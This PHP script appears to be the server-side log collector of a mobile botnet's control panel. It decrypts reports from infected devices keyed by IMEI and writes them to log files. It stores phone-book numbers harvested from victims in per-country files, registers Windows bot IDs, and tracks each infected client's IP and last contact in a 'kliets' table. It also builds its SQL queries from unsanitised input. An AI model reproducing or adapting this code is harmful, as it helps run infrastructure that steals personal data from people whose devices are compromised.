<?php
include 'crypt.php';
include 'config.php';

$request = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);

$request = mb_substr($request, 0, mb_strlen($request));
$request =  decrypt($request,cryptKey);

$massivReq = explode("|", $request);
$IMEI_log =  isset($massivReq[0]) ? $massivReq[0] : "";
$text_log =isset($massivReq[1]) ? $massivReq[1] : "";

if(($IMEI_log != "") && ($text_log != "")){
	if(preg_match('|^[A-Z0-9]+$|i', $IMEI_log)){
	//Записываем ЛОГи!
	$path_log = "../".namefolder."/application/datalogs/logs/$IMEI_log.log";
	$perehod = "\n";
	$data_log = date('Y-m-d H:i');
	$ss = str_replace("</br>","",$text_log);
	$ss = str_replace("Numbers from the phone book","Numbers from the phone book\n",$ss);
	$str_log = "$perehod$data_log: $ss$perehod";
	file_put_contents($path_log, $str_log, FILE_APPEND);

	//---
	if (preg_match("/Numbers from the phone book/",$text_log))
	{
		$country = mb_substr($text_log, 0, 4);
		$ss = " Numbers from the phone book";
		$text_num = str_replace("$country$ss","",$text_log);
		$country = str_replace(" ","",$country);

		if(preg_match('|^[A-Z0-9()]+$|i', $country)){
		$path_nums = "../".namefolder."/application/datalogs/numers/$country.html";
		$str_nums = "$text_num";

		file_put_contents($path_nums, $str_nums, FILE_APPEND);
	 }
	}
	//---
	if (preg_match("/ID Windows Bot:/",$text_log)){
		$getIdBotWindows = str_replace("ID Windows Bot:","",$text_log);
		$getIdBotWindows = str_replace(" ","",$getIdBotWindows);

		$connection2 = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
		$connection2->exec('SET NAMES utf8');


		$statement2 = $connection2->prepare("SELECT * FROM idbotwindows WHERE idbot='$getIdBotWindows'");
		$statement2->execute([$getIdBotWindows]);

		$isIdBotWin = false;
		foreach($statement2 as $row){
			if($row['idbot']=="$getIdBotWindows"){
				$isIdBotWin=true;
			}
		}
		if(!$isIdBotWin){
			$statement2 = $connection2->prepare("insert into idbotwindows (idbot) value ('$getIdBotWindows')");
			$statement2->execute(array($getIdBotWindows));
		}
	}
	//---

	$connection = new PDO('mysql:host='.SERVER.';dbname='.DB, USER, PASSWORD);
	$connection->exec('SET NAMES utf8');
	$data_ = date('Y-m-d H:i:s');

	$ipbot = GetIP();
	$statement = $connection->prepare("UPDATE kliets SET lastConnect = '$data_', ip = '$ipbot' WHERE IMEI = '$IMEI_log'");
	$statement->execute(array($data_, $IMEI_log, $ipbot));

	$statement = $connection->prepare("SELECT log,IMEI FROM kliets WHERE IMEI='$IMEI_log'");
	$statement->execute([$IMEI_log]);
	foreach($statement as $row){
		if($row['log']!='2'){
			$statement = $connection->prepare("UPDATE kliets SET log = '1' WHERE IMEI = '$IMEI_log'");
			$statement->execute([$IMEI_log]);
			break;
		}
	}
	if (preg_match("/Found files by signatures:/",$text_log))
	{
		$statement = $connection->prepare("UPDATE kliets SET log = '2' WHERE IMEI = '$IMEI_log'");
		$statement->execute([$IMEI_log]);
	}
}
echo "||ok||";
}


function GetIP() {
  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
  } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
  }
  return $ip;
}
?>
